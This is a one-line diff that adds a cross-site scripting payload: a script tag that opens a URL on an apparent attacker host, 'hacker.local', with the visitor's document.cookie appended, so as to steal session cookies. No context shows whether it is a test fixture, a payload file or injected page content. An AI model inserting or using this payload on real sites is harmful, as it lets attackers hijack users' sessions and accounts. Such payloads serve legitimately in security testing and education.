@@ -1,0 +1,1 @@
+<script>window.open("http://hacker.local/xss/getcookie.php?cookie=" + document.cookie)</script>
